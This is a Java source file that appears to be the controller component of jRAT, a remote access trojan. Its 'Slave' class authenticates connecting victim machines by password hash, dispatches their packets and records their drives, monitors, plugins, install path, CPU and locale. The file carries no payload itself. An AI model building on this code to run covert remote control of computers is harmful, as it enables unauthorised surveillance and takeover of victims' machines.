package jrat.controller;

import graphslib.monitors.RemoteMonitor;
import jrat.common.hash.Sha1;
import jrat.controller.exceptions.CloseException;
import jrat.controller.net.ServerListener;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.controller.packets.outgoing.OutgoingPacket;
import jrat.controller.packets.outgoing.Packet0Ping;

import java.io.DataOutputStream;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Slave extends AbstractSlave {

	public static final short HEADER_HANDSHAKE = 1;

	private final List<String> queue = new ArrayList<>();
	private Drive[] drives;
	private RemoteMonitor[] monitors;
	private String[] plugins;

	private String serverpath = "";
	private String javaver = "";
	private String javapath = "";
	private String installdate = "";
	private String longcountry;
	private String language = "";
	private String displaylanguage = "";

	private String cpu;
	private short cores;

	public Slave(ServerListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	public void run() {
		try {
			initialize();	

			while (true) {
				short header = readShort();

				if (header == HEADER_HANDSHAKE) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setAuthenticated(true);
						continue;
					}
				}

				if (!isAuthenticated()) {
					Main.instance.getPanelLog().addEntry(LogAction.WARNING, this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			disconnect(ex);
		}
	}
	
	public synchronized void addToSendQueue(OutgoingPacket packet) {
		try {
			sendPacket(packet, dos);
		} catch (SocketException e) {
			e.printStackTrace();
			disconnect(e);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public synchronized final void sendPacket(OutgoingPacket packet, DataOutputStream dos) throws Exception {
        writeShort(packet.getPacketId());
        packet.write(this);
	}	

	@Override
	public void ping() throws Exception {
		addToSendQueue(new Packet0Ping());
	}

	@Override
	public boolean equals(Object o) {
		if (o instanceof Slave) {
			return ((Slave) o).getIP().equals(getIP());
		} else {
			return false;
		}
	}

	public static boolean shouldFix(String i) {
		return i.contains(" / ");
	}

	public static String fix(String i) {
		return i.split(" / ")[0];
	}

	public List<String> getQueue() {
		return queue;
	}

	public Drive[] getDrives() {
		return drives;
	}

	public void setDrives(Drive[] drives) {
		this.drives = drives;
	}

	public RemoteMonitor[] getMonitors() {
		return monitors;
	}

	public void setMonitors(RemoteMonitor[] monitors) {
		this.monitors = monitors;
	}

	public String getServerPath() {
		return serverpath;
	}

	public void setServerPath(String serverpath) {
		this.serverpath = serverpath;
	}

	public String getJavaVersion() {
		return javaver;
	}

	public void setJavaVersion(String javaver) {
		this.javaver = javaver;
	}

	public String getJavaPath() {
		return javapath;
	}

	public void setJavaPath(String javapath) {
		this.javapath = javapath;
	}

	public String getInstallDate() {
		return installdate;
	}

	public void setInstallDate(String date) {
		this.installdate = date;
	}

	public String getLongCountry() {
		return longcountry;
	}

	public void setLongCountry(String longcountry) {
		this.longcountry = longcountry;
	}

	public short getCores() {
		return cores;
	}

	public void setCores(short cores) {
		this.cores = cores;
	}
	
	public String getCPU() {
		return cpu;
	}
	
	public void setCPU(String cpu) {
		this.cpu = cpu;
	}

	public String getDisplayLanguage() {
		return displaylanguage;
	}

	public void setDisplayLanguage(String language) {
		this.displaylanguage = language;
	}

	public String getLanguage() {
		return language.toUpperCase();
	}

	public void setLanguage(String language) {
		this.language = language;
	}

	public double readDouble() throws Exception {
		return dis.readDouble();
	}

	public String[] getPlugins() {
		return plugins;
	}

	public void setPlugins(String[] plugins) {
		this.plugins = plugins;
	}
}
